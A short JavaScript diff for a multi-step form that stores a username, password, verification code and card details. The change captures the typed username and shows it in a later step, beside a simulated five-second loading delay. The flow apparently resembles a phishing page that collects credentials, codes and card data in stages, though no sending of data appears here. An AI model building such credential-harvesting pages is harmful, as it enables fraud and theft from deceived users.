@@ -7,7 +7,7 @@ let attempts = {
 
 // User data storage
 const userData = {
-    username: 'example@example.com',
+    username: '',
     password: '',
     verificationCode: '',
     card: {
@@ -110,6 +110,14 @@ document.addEventListener('DOMContentLoaded', function() {
 // Handle username step
 function handleUsernameNext(e) {
     e.preventDefault();
+    
+    // Get the actual username input
+    const usernameInput = document.getElementById('username');
+    userData.username = usernameInput.value;
+    
+    // Update the disabled username field in step 2
+    document.getElementById('username-disabled').value = userData.username;
+    
     showLoading();
 
     // Simulate loading for 5 seconds
